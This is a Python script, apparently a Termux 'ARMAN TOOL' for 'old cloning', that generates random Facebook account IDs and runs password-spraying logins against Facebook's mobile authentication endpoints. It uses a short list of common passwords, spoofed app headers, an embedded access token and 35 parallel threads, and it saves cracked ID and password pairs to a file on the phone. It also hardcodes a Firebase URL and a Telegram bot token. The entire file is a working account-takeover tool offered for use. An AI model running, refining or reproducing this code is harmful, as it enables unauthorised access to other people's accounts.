import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import warnings
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta

warnings.filterwarnings("ignore", category=SyntaxWarning)

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
TELEGRAM_USER = "7111707713"

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower():
                return model
            return f"{brand} {model}"
        elif model:
            return model
        elif brand:
            return brand
    except Exception:
        pass
    return "Unknown Device"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
    except Exception:
        return "Unknown"

def get_hwid():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        device = os.popen("getprop ro.product.device").read().strip()
        if brand or model or device:
            combined = f"{brand}_{model}_{device}"
            if len(combined.strip("_")) > 2:
                return combined
    except Exception:
        pass
    return "ARMAN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def display_welcome_banner(user_name, user_key, time_left):
    os.system('clear')
    print(f"""
\033[1;36m╔════════════════════════════════════════════╗
║             🔥 ARMAN TOOL 🔥               ║
╠════════════════════════════════════════════╣
║ 🇵🇰 ᴘᴛɪ       : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
║ 👑 ᴋʜᴀɴ ᴅɪᴡᴀɴᴀ: ᴅɪʟ ᴍᴀɪɴ ɪᴍʀᴀɴ ᴋʜᴀɴ         ║
║ ⏳ ᴠᴀʟɪᴅɪᴛʏ  : {time_left:<27} ║
║ ⚡ sʏsᴛᴇᴍ ᴋᴀ ʙᴀᴘ: ɪᴍʀᴀɴ ᴋʜᴀɴ               ║
╚════════════════════════════════════════════╝\033[0m
""")

def check_key():
    try:
        display_welcome_banner("ARMAN USER", "VIP-BYPASS", "Lifetime")
        print("\n\033[1;32m[✓] Bypass Active - Loading Menu Directly...\033[0m")
        time.sleep(1)
        return "ARMAN USER", "VIP-BYPASS", "Lifetime"
    except Exception:
        return "USER", "DEFAULT", "Lifetime"

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
W = '\x1b[1;37m'

def window1():
    fb_ua_list = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.25.115;]",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.037) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/FBIOS;FBAV/425.0.0.12.34;]",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    ]
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    return random.choice([A] + fb_ua_list)

def get_smart_headers():
    ua = window1()
    return {
        "Host": "b-graph.facebook.com",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "X-Requested-With": "com.facebook.katana",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }

def show_branding():
    os.system('clear')
    print("\033[1;32m")
    print(r"      _    ____  ____  __  __    _    _   _ ")
    print(r"     / \  |  _ \|  _ \|  \/  |  / \  | \ | |")
    print(r"    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |")
    print(r"   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |")
    print(r"  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|")
    print("\033[0m")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING (HIGH CHANCE)")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def ____banner____():
    show_branding()

def creationyear(uid):
    if uid.startswith(('1000000000', '1000000001')): return '2006'
    if uid.startswith(('1000000002', '1000000003')): return '2007'
    if uid.startswith(('1000000004', '1000000005')): return '2008'
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    else: return ''

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46m2009 series')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46m2006 2007 2008 ACCOUNT (HIGH CHANCE)')
    linex()
    __Jihad__ = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
    if __Jihad__ in ('A', 'a', '1'):
        all_series_clone()
    elif __Jihad__ in ('B', 'b', '2'):
        series_100003_4()
    elif __Jihad__ in ('C', 'c', '3'):
        series_2009()
    elif __Jihad__ in ('D', 'd', '4'):
        series_2006_2008()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def all_series_clone():
    user = []
    ____banner____()
    print("       \x1b[38;5;49mALL SERIES ACTIVE (Mix Range)")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        uid = random.choice(['10000000', '10000003', '10000004', '100000']) + ''.join(random.choices('0123456789', k=7))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def series_100003_4():
    user = []
    ____banner____()
    print("       \x1b[38;5;49m100003/4 SERIES ACTIVE")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        uid = random.choice(['100003', '100004']) + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def series_2009():
    user = []
    ____banner____()
    print("       \x1b[38;5;49m2009 SERIES ACTIVE")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        uid = '10000000' + ''.join(random.choices('0123456789', k=7))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def series_2006_2008():
    user = []
    ____banner____()
    print("       \x1b[38;5;49m2006 2007 2008 HIGH CHANCE SERIES ACTIVE")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        # Optimized range targeting actual active old sub-prefixes
        prefix = random.choice(['100000000', '100000001', '100000002', '100000003', '100000004'])
        uid = prefix + ''.join(random.choices('0123456789', k=6))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        # Expanded vintage password dictionary for older accounts
        for pw in ('123456', '1234567', '12345678', '123456789', 'password', '112233', '123321', '786786', 'pakistan', '12345', 'khan123', 'admin123'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = get_smart_headers()
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '11223344', 'Pakistan', '786786', '123321', 'password'):
        try:
            with requests.Session() as session:
                headers = get_smart_headers()
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1

if __name__ == '__main__':
    result = check_key()
    if result:
        BNG_71_()
        
